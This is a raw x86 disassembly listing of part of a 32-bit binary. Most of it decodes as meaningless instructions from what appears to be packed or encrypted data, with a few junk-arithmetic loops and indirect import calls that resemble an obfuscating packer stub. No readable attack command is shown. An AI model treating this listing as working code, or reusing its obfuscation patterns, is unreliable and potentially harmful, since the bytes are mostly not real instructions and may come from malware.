  4067fb:	and    al,cl
  4067fd:	add    al,0x52
  406800:	jge    0x406849
  406802:	mov    dl,dh
  406804:	sub    ecx,edx
  406806:	mov    ecx,0x5f5b037d
  40680b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40680c:	pushaw 
  40680e:	adc    eax,0x62642be4
  406813:	and    DWORD PTR [ecx-0x1f],0x2b56c943
  40681a:	jecxz  0x406819
  40681c:	jle    0x40686c
  40681e:	loope  0x406897
  406820:	in     eax,0x9e
  406822:	jmp    0x54224c48
  406827:	pusha  
  406828:	mov    al,0x5a
  40682a:	and    dl,cl
  40682c:	addr16 call 0x375311b4
  406832:	out    0xa7,al
  406834:	add    edi,edx
  406836:	leave  
  406837:	xchg   esi,eax
  406838:	das    
  406839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40683a:	pusha  
  40683b:	sbb    dl,bl
  40683d:	cmp    BYTE PTR [ecx-0x20],0xee
  406841:	cs out 0xf2,al
  406844:	push   edx
  406845:	sub    BYTE PTR [eax+0x58],bl
  406848:	bound  ebx,QWORD PTR [edx-0x47eb63c0]
  40684e:	add    ebp,DWORD PTR [edi+0x2]
  406851:	pop    es
  406852:	cmp    DWORD PTR ds:0x8c3c0438,edx
  406858:	mov    eax,ds:0xda321465
  40685d:	cdq    
  40685e:	jge    0x4068ac
  406860:	xchg   ebx,eax
  406861:	push   ds
  406862:	scas   eax,DWORD PTR es:[edi]
  406863:	sbb    DWORD PTR [esi],edx
  406865:	test   ch,bl
  406867:	push   es
  406868:	test   DWORD PTR ds:0xfc3c8ff3,ebx
  40686e:	inc    ecx
  40686f:	lahf   
  406870:	adc    dl,ch
  406872:	inc    ebx
  406873:	ja     0x40686d
  406875:	int3   
  406876:	jns    0x406899
  406878:	icebp  
  406879:	rol    DWORD PTR [edx-0x66b0cf52],cl
  40687f:	jl     0x4068db
  406881:	imul   esi,esi,0xffffffe3
  406884:	mov    edx,0xce447830
  406889:	pop    esi
  40688a:	dec    edi
  40688b:	(bad)  
  40688c:	repnz mov al,0xe2
  40688f:	cli    
  406890:	inc    edi
  406891:	aam    0xb4
  406893:	lds    ebp,FWORD PTR [edi-0x3d]
  406896:	retf   
  406897:	pop    ss
  406898:	adc    edi,DWORD PTR [ecx-0x3b]
  40689b:	sub    edx,eax
  40689d:	ds mov ecx,0x82027fc0
  4068a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068a4:	mov    al,BYTE PTR [edx]
  4068a6:	jns    0x406839
  4068a8:	xor    dl,BYTE PTR [edi+0x40]
  4068ab:	xchg   ebp,eax
  4068ac:	adc    ecx,edx
  4068ae:	push   edi
  4068af:	out    0x58,eax
  4068b1:	push   ebx
  4068b2:	idiv   DWORD PTR [ebx-0x694ca1c7]
  4068b8:	and    bh,0x51
  4068bb:	ds jecxz 0x406879
  4068be:	shl    DWORD PTR [ebp-0x680c6018],0x24
  4068c5:	fdivr  DWORD PTR [esi-0x71195856]
  4068cb:	xor    bl,BYTE PTR [edx-0xeb9a0f4]
  4068d1:	popf   
  4068d2:	rol    DWORD PTR [edi],1
  4068d4:	pop    ebp
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7dd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7dd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7dd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaca
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7dd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7dd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7dd,eax
  406931:	mov    eax,ds:0x42a7dd
  406936:	dec    eax
  406937:	mov    ds:0x42a7dd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a789,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	pusha  
  40695c:	imul   esp,DWORD PTR [edi-0x75],0x7878c900
  406963:	fs jle 0x4069de
  406966:	js     0x4069be
  406968:	and    al,0x67
  40696a:	dec    esp
  40696b:	and    BYTE PTR [ebx-0x1de5749d],ch
  406971:	inc    ebp
  406972:	and    BYTE PTR [eax+0x23],ch
  406975:	fistp  WORD PTR ss:[esi-0x6e]
  406979:	outs   dx,BYTE PTR ds:[esi]
  40697a:	mov    ds:0xd9070cc3,eax
  40697f:	mov    cl,0x4d
  406981:	push   eax
  406982:	iret   
  406983:	dec    esp
  406984:	enter  0x6f8b,0xf6
  406988:	stos   DWORD PTR es:[edi],eax
  406989:	adc    DWORD PTR [edi],edi
  40698b:	mov    cs,WORD PTR [edi-0x4700e3fd]
  406991:	mov    eax,DWORD PTR [esi]
  406993:	add    ebx,ebp
  406995:	mov    BYTE PTR [ecx-0xd1243e4],al
  40699b:	pushf  
  40699c:	add    eax,0x56d12a74
  4069a1:	cmp    al,0x6d
  4069a3:	add    BYTE PTR [edi+ecx*1],0x7e
  4069a7:	inc    ecx
  4069a8:	out    dx,al
  4069a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069aa:	adc    bl,BYTE PTR ds:0x23904c3e
  4069b0:	mov    bh,0x99
  4069b2:	mov    ah,0x85
  4069b4:	or     al,0x2b
  4069b6:	mov    eax,0x3149627e
  4069bb:	das    
  4069bc:	mov    ebp,0x17d823ce
  4069c1:	cmp    eax,DWORD PTR [ecx]
  4069c3:	sub    eax,0xc220706a
  4069c8:	mov    ch,0xe3
  4069ca:	cdq    
  4069cb:	sub    ecx,eax
  4069cd:	sub    eax,0x32249f3a
  4069d2:	mov    DWORD PTR ds:0x96297943,ecx
  4069d8:	cdq    
  4069d9:	sti    
  4069da:	sahf   
  4069db:	sti    
  4069dc:	test   BYTE PTR [di-0x31],al
  4069e0:	int3   
  4069e1:	rcl    BYTE PTR [ebp-0x78],0x96
  4069e5:	mov    dh,0x0
  4069e7:	add    DWORD PTR [esi+0x1b],edx
  4069ea:	xchg   ebx,eax
  4069eb:	(bad)  
  4069ec:	add    eax,DWORD PTR ds:[eax+0x53e7cc2b]
  4069f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069f4:	jbe    0x406a68
  4069f6:	add    BYTE PTR [eax+0x39],cl
  4069f9:	loope  0x4069e2
  4069fb:	jnp    0x4069f9
  4069fd:	dec    eax
  4069fe:	fisubr DWORD PTR [edi-0x5266782]
  406a04:	and    eax,0xd5440127
  406a09:	push   esp
  406a0a:	push   edx
  406a0b:	leave  
  406a0c:	aaa    
  406a0d:	test   BYTE PTR [edi-0x10],ch
  406a10:	imul   ecx,DWORD PTR [ebx-0x5],0xafbb73c5
  406a17:	dec    ebx
  406a18:	sub    eax,0xd8241b96
  406a1d:	push   esi
  406a1e:	js     0x4069c2
  406a20:	fxam   
  406a22:	icebp  
  406a23:	cmp    eax,0x408a0259
  406a28:	fiadd  WORD PTR ds:0x74ba86b
  406a2e:	imul   edi,DWORD PTR [edi],0x71
  406a31:	fstp   QWORD PTR [edi+0x4a4e92f4]
  406a37:	mov    ds:0xf3adc8bb,eax
  406a3c:	jmp    0xb9bc:0x675eb739
  406a43:	sub    al,0x15
  406a45:	inc    ecx
  406a46:	je     0x406a92
  406a48:	mov    BYTE PTR [ebp+ebx*8-0x6041c246],bh
  406a4f:	ins    DWORD PTR es:[edi],dx
  406a50:	and    al,0xfe
  406a52:	cmp    eax,0x1963c854
  406a57:	ja     0x406a50
  406a59:	add    al,0x5a
  406a5b:	loope  0x406a92
  406a5d:	xor    al,0xff
  406a5f:	sub    al,0xbb
  406a61:	adc    al,0x51
  406a63:	stos   BYTE PTR es:[edi],al
  406a64:	in     eax,0x65
  406a66:	sub    ch,dh
  406a68:	sub    bh,0x1f
  406a6b:	mov    cl,BYTE PTR [ecx-0xc]
  406a6e:	imul   ebp,DWORD PTR [edi],0xbb65ba32
  406a74:	aas    
  406a75:	xor    BYTE PTR [ebp-0x3c0f7ba6],bl
  406a7b:	test   eax,0xce10817f
  406a80:	or     ebp,DWORD PTR [edi]
  406a82:	pushf  
  406a83:	mov    edx,0x5960324a
  406a88:	iret   
  406a89:	jmp    0x607f4460
  406a8e:	inc    edi
  406a8f:	and    BYTE PTR [ecx],bl
  406a91:	sar    BYTE PTR [eax-0x576054fe],0x5c
  406a98:	fisttp QWORD PTR [eax-0x1e]
  406a9b:	push   cs
  406a9c:	or     al,dl
  406a9e:	dec    ebx
  406a9f:	test   eax,0x95d64291
  406aa4:	and    BYTE PTR [ecx-0x31],0x76
  406aa8:	adc    eax,0x107ccd8f
  406aad:	mov    ch,0x3
  406aaf:	pop    ebp
  406ab0:	call   0x60cc:0x105c807d
  406ab7:	mov    dl,0xcb
  406ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aba:	mov    BYTE PTR [edx],ch
  406abc:	xor    DWORD PTR ds:0xc7da1177,eax
  406ac2:	into   
  406ac3:	aaa    
  406ac4:	jecxz  0x406a54
  406ac6:	imul   ebx,DWORD PTR [ebx-0x4455a0db],0x6b
  406acd:	pop    es
  406ace:	or     eax,0xfc72083a
  406ad3:	push   esi
  406ad4:	mov    al,fs:0x93e203f4
  406ada:	dec    edi
  406adb:	xchg   DWORD PTR [ebp+0xc6a55e1],ebp
  406ae1:	cwde   
  406ae2:	(bad)
  406ae5:	test   DWORD PTR [esi+0x3734425a],eax
  406aeb:	cs mov ds,WORD PTR gs:[ebx-0x2f]
  406af0:	rcl    DWORD PTR [edi+0x60ff6869],1
  406af6:	aad    0x5b
  406af8:	sbb    bh,BYTE PTR [edx-0xb040c0d]
  406afe:	div    edi
  406b00:	outs   dx,BYTE PTR ds:[esi]
  406b01:	jmp    0x875cdbb4
  406b06:	aaa    
  406b07:	adc    ch,BYTE PTR [edi+0x26]
  406b0a:	jmp    0x406aa9
  406b0c:	push   cs
  406b0d:	and    DWORD PTR [eax-0x13],edx
  406b10:	arpl   WORD PTR [esi+0x7f0ad8b],si
  406b16:	mov    al,ds:0x4b225e4
  406b1b:	jno    0x406aa7
  406b1d:	ret    0x5c7c
  406b20:	inc    eax
  406b21:	jo     0x406af3
  406b23:	or     al,dh
  406b25:	loopne 0x406b79
  406b27:	adc    dh,BYTE PTR ds:0xf663f6d1
  406b2d:	repz jne 0x406ad9
  406b30:	popa   
  406b31:	rcl    DWORD PTR [edx+0x4b],cl
  406b34:	test   ecx,0x9d5651c
  406b3a:	call   0x77b7:0x463cc2bc
  406b41:	xchg   edx,eax
  406b42:	xor    eax,0xb40698f2
  406b47:	retf   0x7e2f
  406b4a:	push   ecx
  406b4b:	push   esi
  406b4c:	adc    al,0x80
  406b4e:	arpl   WORD PTR [edi-0x67],cx
  406b51:	adc    BYTE PTR [ebp+0x39],bl
  406b54:	jb     0x406bb2
  406b56:	sub    ebx,DWORD PTR [edx]
  406b58:	aad    0x75
  406b5a:	dec    edx
  406b5b:	stc    
  406b5c:	xchg   ebx,eax
  406b5d:	outs   dx,BYTE PTR ds:[esi]
  406b5e:	sbb    ebp,edi
  406b60:	(bad)  
  406b61:	aad    0xf7
  406b63:	shr    DWORD PTR [edi],0xe9
  406b66:	clc    
  406b67:	and    ebp,ebx
  406b69:	and    BYTE PTR [ecx+0x1c],dh
  406b6c:	adc    BYTE PTR [ebx-0xf],al
  406b6f:	dec    esi
  406b70:	mov    dh,0xd
  406b72:	mov    al,ds:0xb4a8a138
  406b77:	xor    BYTE PTR ds:0xf16ac0d,ch
  406b7d:	mov    eax,ds:0x21d1ce80
  406b82:	push   cs
  406b83:	add    al,0x8e
  406b85:	popf   
  406b86:	call   0xbcca:0x68b1a32f
  406b8d:	push   edi
  406b8e:	pop    edx
  406b8f:	pop    ss
  406b90:	pushf  
  406b91:	push   ss
  406b92:	das    
  406b93:	and    esi,DWORD PTR [edi+esi*1-0x41]
  406b97:	push   cs
  406b98:	gs fwait
  406b9a:	push   ebp
  406b9b:	mov    DWORD PTR [eax-0x36],edi
  406b9e:	push   eax
  406b9f:	out    0x7b,al
  406ba1:	(bad)  
  406ba2:	push   edi
  406ba3:	int3   
  406ba4:	repnz rcl BYTE PTR [ebx],cl
  406ba7:	cld    
  406ba8:	enter  0xacb3,0x93
  406bac:	sbb    al,0xee
  406bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406baf:	cmp    BYTE PTR [eax],0x18
  406bb2:	clc    
  406bb3:	rcl    BYTE PTR [eax-0x1a],0x51
  406bb7:	sub    bl,BYTE PTR [edi-0x958073f]
  406bbd:	inc    edx
  406bbe:	sahf   
  406bbf:	dec    esi
  406bc0:	push   ds
  406bc1:	jb     0x406bfd
  406bc3:	scas   al,BYTE PTR es:[edi]
  406bc4:	scas   al,BYTE PTR es:[edi]
  406bc5:	out    0x2c,eax
  406bc7:	mov    ebp,0x2e08160a
  406bcc:	cmp    al,0x85
  406bce:	bound  eax,QWORD PTR [edx-0x2a60d25f]
  406bd4:	out    dx,eax
  406bd5:	or     al,0x37
  406bd7:	lea    eax,[edi-0x32e72e3b]
  406bdd:	jnp    0x406b6a
  406bdf:	dec    esi
  406be0:	inc    eax
  406be1:	mov    al,BYTE PTR [eax-0x68351448]
  406be7:	push   cs
  406be8:	popa   
  406be9:	inc    edx
  406bea:	test   al,0xff
  406bec:	lods   eax,DWORD PTR ds:[esi]
  406bed:	stc    
  406bee:	xchg   esi,eax
  406bef:	into   
  406bf0:	mov    edx,0x817e2265
  406bf5:	or     BYTE PTR ds:0xe42ae4a4,bl
  406bfb:	mov    dh,0xa0
  406bfd:	ror    ecx,cl
  406bff:	lock or edx,esp
  406c02:	or     dh,BYTE PTR gs:[ebx-0x6d]
  406c06:	cs dec ebp
  406c08:	dec    esi
  406c09:	imul   ebp,DWORD PTR [esi-0x72e8d72a],0xde94866f
  406c13:	push   cs
  406c14:	xor    dh,BYTE PTR [eax+0x5cf11244]
  406c1a:	aaa    
  406c1b:	repz xor DWORD PTR [ecx],ecx
  406c1e:	mov    al,ds:0xb277313e
  406c23:	dec    edi
  406c24:	adc    DWORD PTR [esi+0x607fa061],esi
  406c2a:	out    0xc6,al
  406c2c:	cmp    eax,0x9871a0b5
  406c31:	mov    ah,0x61
  406c33:	push   ebx
  406c34:	lea    ebp,[ecx-0x1b]
  406c37:	dec    ebx
  406c38:	popa   
  406c39:	mov    esp,0xe4cede3d
  406c3e:	or     ebx,DWORD PTR [ecx]
  406c40:	add    eax,0x10be29bd
  406c45:	(bad)  
  406c46:	push   ss
  406c47:	sub    ch,BYTE PTR [ecx]
  406c49:	shl    dl,1
  406c4b:	mov    cl,0x38
  406c4d:	sub    ecx,DWORD PTR ds:0x2d083613
  406c53:	mov    eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7e9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a815,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a86d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x50],ebx
  406c91:	mov    DWORD PTR [esi+0x78cf6c78],eax
  406c97:	js     0x406cfd
  406c99:	jle    0x406d13
  406c9b:	js     0x406c2f
  406c9d:	add    bl,BYTE PTR [eax]
  406c9f:	mov    WORD PTR [esi],?
  406ca1:	out    0x8b,al
  406ca3:	ins    DWORD PTR es:[edi],dx
  406ca4:	imul   edx,esp,0x173cc384
  406caa:	(bad)  
  406cab:	out    0xc9,al
  406cad:	cmp    eax,0x7271e36c
  406cb2:	mov    al,0x99
  406cb4:	cli    
  406cb5:	add    al,0x8c
  406cb7:	scas   al,BYTE PTR es:[edi]
  406cb8:	inc    esp
  406cb9:	lahf   
  406cba:	push   ds
  406cbb:	dec    ecx
  406cbc:	pop    eax
  406cbd:	push   es
  406cbe:	mov    ds:0xa0ebf2a,al
  406cc3:	and    eax,0x320043eb
  406cc8:	aad    0x2d
  406cca:	pop    edx
  406ccb:	and    DWORD PTR cs:[ebx],0x50
  406ccf:	scas   al,BYTE PTR es:[edi]
  406cd0:	pop    edi
  406cd1:	loop   0x406d3c
  406cd3:	jecxz  0x406d27
  406cd5:	mov    dl,0x6c
  406cd7:	outs   dx,BYTE PTR ds:[esi]
  406cd8:	dec    eax
  406cd9:	sub    ebp,DWORD PTR [ecx]
  406cdb:	push   0xffffffd3
  406cdd:	mov    edx,0xcbf25b91
  406ce2:	xchg   DWORD PTR [edx-0x482da6e0],eax
  406ce8:	or     esi,DWORD PTR [ebx+0x41]
  406ceb:	repnz cmc 
  406ced:	push   es
  406cee:	daa    
  406cef:	xchg   esp,eax
  406cf0:	(bad)  
  406cf1:	pop    ebp
  406cf2:	test   al,0x18
  406cf4:	adc    al,0x89
  406cf6:	lahf   
  406cf7:	pop    es
  406cf8:	sar    DWORD PTR [ecx+0xb],0x67
  406cfc:	fistp  WORD PTR fs:[ebp+esi*8-0x19e66510]
  406d04:	mov    ebx,0x4acb83a7
  406d09:	mov    ah,0xb9
  406d0b:	inc    ecx
  406d0c:	sahf   
  406d0d:	outs   dx,DWORD PTR ds:[esi]
  406d0e:	out    0x20,al
  406d10:	dec    ebx
  406d11:	out    0x13,al
  406d13:	outs   dx,BYTE PTR ds:[esi]
  406d14:	inc    ebx
  406d15:	sub    al,0x52
  406d17:	sbb    BYTE PTR [eax+edi*2],cl
  406d1a:	nop
  406d1b:	jo     0x406d63
  406d1d:	clc    
  406d1e:	jmp    0x406d31
  406d20:	inc    edi
  406d21:	outs   dx,BYTE PTR ds:[esi]
  406d22:	dec    ebp
  406d23:	add    al,0x8f
  406d25:	or     BYTE PTR [ebx+edi*1+0x5d409e9],al
  406d2c:	addr16 leave 
  406d2e:	leave  
  406d2f:	add    al,0x91
  406d31:	cmp    eax,0x2a303c36
  406d36:	loop   0x406d69
  406d38:	cld    
  406d39:	adc    DWORD PTR [esi],esp
  406d3b:	add    eax,0x23cba9fa
  406d40:	mov    esi,0x388c2412
  406d45:	outs   dx,DWORD PTR ds:[esi]
  406d46:	mov    ebp,ebx
  406d48:	and    dl,ah
  406d4a:	aad    0xd7
  406d4c:	ror    ch,1
  406d4e:	or     esi,DWORD PTR [edx-0x3cdcc179]
  406d54:	xchg   ebx,eax
  406d55:	mov    ecx,0x6650cf60
  406d5a:	pop    ss
  406d5b:	repz icebp 
  406d5d:	cmp    esp,DWORD PTR [eax-0x76983f93]
  406d63:	out    dx,al
  406d64:	(bad)  
  406d66:	dec    ebx
  406d67:	xor    DWORD PTR [eax],0x2a
  406d6a:	jmp    0x3b9b:0x6038641c
  406d71:	test   al,0x93
  406d73:	sbb    dh,BYTE PTR [ebp+0x2423638d]
  406d79:	xor    eax,0x43bd616d
  406d7e:	fwait
  406d7f:	stc    
  406d80:	retf   0x146c
  406d83:	xchg   BYTE PTR [ebx],bh
  406d85:	cmp    DWORD PTR [ebx],edi
  406d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d88:	cdq    
  406d89:	xchg   edi,eax
  406d8a:	out    0x37,eax
  406d8c:	pop    ecx
  406d8d:	mov    cl,0x83
  406d8f:	pop    esi
  406d90:	ret    
  406d91:	clc    
  406d92:	xor    ebp,DWORD PTR [edx+0x1baf2f1f]
  406d98:	add    al,0xff
  406d9a:	sub    eax,DWORD PTR [ebx+ebx*4-0x31]
  406d9e:	fucom  st(5)
  406da0:	test   cl,ch
  406da2:	mov    eax,0x2cf6fa5c
  406da7:	cmp    al,0xe4
  406da9:	pop    ebp
  406daa:	fwait
  406dab:	popf   
  406dac:	dec    eax
  406dad:	pop    ebx
  406dae:	in     eax,0xda
  406db0:	xor    BYTE PTR [esi+eax*2+0x409ea723],0x35
  406db8:	je     0x406dcc
  406dba:	jecxz  0x406e2c
  406dbc:	fcomp  QWORD PTR [ecx-0x2]
  406dbf:	rcl    bl,cl
  406dc1:	and    BYTE PTR [ebx-0x1d6372a1],dl
  406dc7:	or     ebx,DWORD PTR ds:0x165c8706
  406dcd:	mov    ch,0x77
  406dcf:	adc    bh,dl
  406dd1:	pop    esp
  406dd2:	daa    
  406dd3:	je     0x406de7
  406dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd7:	fnclex 
  406dd9:	iret   
  406dda:	and    ecx,DWORD PTR [ebx+0x40]
  406ddd:	adc    ebp,DWORD PTR [ebx]
  406ddf:	ins    BYTE PTR es:[edi],dx
  406de0:	scas   eax,DWORD PTR es:[edi]
  406de1:	jecxz  0x406e14
  406de3:	push   ebx
  406de4:	adc    al,0xe5
  406de6:	pop    eax
  406de7:	pop    edi
  406de8:	imul   ebx,DWORD PTR [ebp-0x232398ea],0x40e78d8b
  406df2:	jns    0x406d77
  406df4:	js     0x406e19
  406df6:	in     al,0x2b
  406df8:	mov    ah,0x82
  406dfa:	and    al,0x8b
  406dfc:	pop    ecx
  406dfd:	xor    DWORD PTR [esi-0x58a7931],0xdb691a37
  406e07:	mov    esp,0x1ef17df9
  406e0c:	call   0x6650ba19
  406e11:	(bad)  
  406e12:	int3   
  406e13:	jns    0x406deb
  406e15:	lock es dec esp
  406e18:	pop    DWORD PTR [eax+0x6a]
  406e1b:	mov    ds:0x9315fcf4,eax
  406e20:	mov    al,fs:0x43f68e15
  406e26:	les    eax,FWORD PTR [ebx]
  406e28:	mov    ch,0x13
  406e2a:	add    eax,0xe53bae63
  406e2f:	lods   eax,DWORD PTR ds:[esi]
  406e30:	call   0xe40d:0xf5b228e2
  406e37:	mov    ch,0xcb
  406e39:	(bad)
  406e3d:	cwde   
  406e3e:	adc    ecx,DWORD PTR [ebx]
  406e40:	xchg   edx,eax
  406e41:	mov    al,ds:0x726d954c
  406e46:	test   eax,0x783618e3
  406e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e4c:	outs   dx,DWORD PTR ds:[esi]
  406e4d:	nop
  406e4e:	xchg   BYTE PTR [ebx-0x3e6805d2],cl
  406e54:	outs   dx,BYTE PTR ds:[esi]
  406e55:	aaa    
  406e56:	and    ebp,edi
  406e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e59:	test   esi,edx
  406e5b:	or     ebp,DWORD PTR [ebx]
  406e5d:	mov    ah,0x3c
  406e5f:	imul   ecx,DWORD PTR [eax-0xc6ea913],0x58
  406e66:	cmp    eax,0x967f9487
  406e6b:	pop    ebp
  406e6c:	add    bl,dh
  406e6e:	sti    
  406e6f:	cmc    
  406e70:	ins    BYTE PTR es:[edi],dx
  406e71:	stos   BYTE PTR es:[edi],al
  406e72:	mov    al,0x30
  406e74:	xlat   BYTE PTR ds:[ebx]
  406e75:	(bad)  
  406e76:	mov    ?,WORD PTR ds:0x4167f951
  406e7c:	cmp    bh,dh
  406e7e:	lds    ebp,FWORD PTR [esi-0x76b04d6]
  406e84:	xchg   edi,eax
  406e85:	jns    0x406ec7
  406e87:	retf   0xb7d6
  406e8a:	jl     0x406e49
  406e8c:	stc    
  406e8d:	inc    esp
  406e8e:	cmp    eax,0xd6a66ccb
  406e93:	adc    esp,DWORD PTR [ecx]
  406e95:	mov    bl,BYTE PTR [eax+0x5e8c8678]
  406e9b:	and    BYTE PTR [edx+0x24],cl
  406e9e:	repz div BYTE PTR [esi-0x2f]
  406ea2:	inc    esp
  406ea3:	mov    fs,WORD PTR [esp+ebx*2-0x4838d2f7]
  406eaa:	inc    ecx
  406eab:	mov    dh,0x11
  406ead:	test   al,0xea
  406eaf:	hlt    
  406eb0:	pop    ss
  406eb1:	adc    BYTE PTR [edi+0x1b],ah
  406eb4:	popa   
  406eb5:	popa   
  406eb6:	mov    ds:0xdc90929a,eax
  406ebb:	or     dh,al
  406ebd:	inc    edx
  406ebe:	mov    WORD PTR [eax],es
  406ec0:	jne    0x406e4e
  406ec2:	xor    edi,esi
  406ec4:	sub    BYTE PTR [ebp+0x75],ah
  406ec7:	retf   0x692
  406eca:	sub    DWORD PTR [edx+eax*2-0x73b34287],esp
  406ed1:	mov    edx,0xa672796e
  406ed6:	jo     0x406ece
  406ed8:	mov    DWORD PTR [ecx+0x39],edx
  406edb:	(bad)  
  406edc:	nop
  406edd:	add    eax,0xabce8733
  406ee2:	aas    
  406ee3:	xchg   ecx,eax
  406ee4:	mov    ebp,0xf6044912
  406ee9:	dec    esp
  406eea:	test   eax,0xd0f896b8
  406eef:	repz lock mov dl,0x55
  406ef3:	test   BYTE PTR [esi-0x74],cl
  406ef6:	inc    esi
  406ef7:	xor    BYTE PTR [edi+0x7d],cl
  406efa:	out    0x9c,eax
  406efc:	dec    eax
  406efd:	mov    ds:0x7525e5e2,eax
  406f02:	dec    ebx
  406f03:	push   ecx
  406f04:	push   edx
  406f05:	je     0x406f18
  406f07:	cmp    BYTE PTR [esp+eax*1-0x6b],al
  406f0b:	pop    ds
  406f0c:	inc    esi
  406f0d:	and    eax,0xdfbb6b88
  406f12:	and    edx,DWORD PTR [edi+ebx*2+0x2b3ffa60]
  406f19:	push   ss
  406f1a:	iret   
  406f1b:	sub    ah,bh
  406f1d:	in     al,dx
  406f1e:	xchg   edx,eax
  406f1f:	rcr    DWORD PTR ds:0x566ff5ef,1
  406f25:	fsub   DWORD PTR [esi+eiz*2]
  406f28:	test   BYTE PTR ds:0x231a029,bl
  406f2e:	fmul   DWORD PTR [edx]
  406f30:	xchg   esi,eax
  406f31:	and    DWORD PTR [edx+0x8],edx
  406f34:	loopne 0x406f7d
  406f36:	xor    BYTE PTR [esi-0x3f],al
  406f39:	sub    cl,BYTE PTR [ecx+0x11caa9a9]
  406f3f:	outs   dx,DWORD PTR ds:[esi]
  406f40:	mov    esi,DWORD PTR [esi]
  406f42:	xchg   ebx,eax
  406f43:	fisub  WORD PTR [esi-0x2]
  406f46:	dec    ecx
  406f47:	pop    ds
  406f48:	mov    bl,0x1d
  406f4a:	nop
  406f4b:	xchg   esi,eax
  406f4c:	jle    0x406f1b
  406f4e:	mov    ecx,DWORD PTR [esi-0x2c]
  406f51:	shl    BYTE PTR [edi],1
  406f53:	mov    esp,DWORD PTR [ecx-0x75]
  406f56:	add    ecx,DWORD PTR [ebp-0x2561338b]
  406f5c:	imul   edx,DWORD PTR [edx-0x49],0xb80e393a
  406f63:	xor    al,BYTE PTR [edi+0x38e44808]
  406f69:	lods   eax,DWORD PTR ds:[esi]
  406f6a:	dec    ebx
  406f6b:	dec    ebp
  406f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f6d:	cmp    dh,BYTE PTR [ecx-0x73]
  406f70:	inc    esp
  406f71:	fdiv   DWORD PTR [eax-0x69b13d9e]
  406f77:	push   cs
  406f78:	lahf   
  406f79:	daa    
  406f7a:	dec    esi
  406f7b:	mov    esi,0x5de0e65e
  406f80:	jmp    0x406f83
  406f82:	es pop ecx
  406f84:	add    bl,BYTE PTR [esi+0x366e370]
  406f8a:	rcr    DWORD PTR [ebx],0xd
  406f8d:	mov    eax,ds:0xf0042a8
  406f92:	mov    bh,0xc0
  406f94:	and    DWORD PTR ds:0x42a8a5,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a8a5
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a8a5,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a8a5,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a8a5,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab42
  406fd4:	push   0x42ab42
  406fd9:	push   0x42ab24
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a8a5,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a8a5
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a8a5,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7e9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a78d
  407014:	sub    DWORD PTR ds:0x42a861,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0xdd,al
  40702c:	shr    DWORD PTR [edx+0x30],0x58
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407068
  407038:	daa    
  407039:	mov    ?,WORD PTR [esi]
  40703b:	mov    bh,0x4
  40703d:	fld    DWORD PTR [edx+ecx*4+0x71]
  407041:	out    0x69,eax
  407043:	daa    
  407044:	lea    esp,[ecx]
  407046:	icebp  
  407047:	or     al,0x54
  407049:	mov    esp,0xf03c07de
  40704e:	pop    ebp
  40704f:	arpl   dx,sp
  407051:	mov    DWORD PTR [ebp+0x7f],edx
  407054:	imul   eax,esp,0x6f69d02e
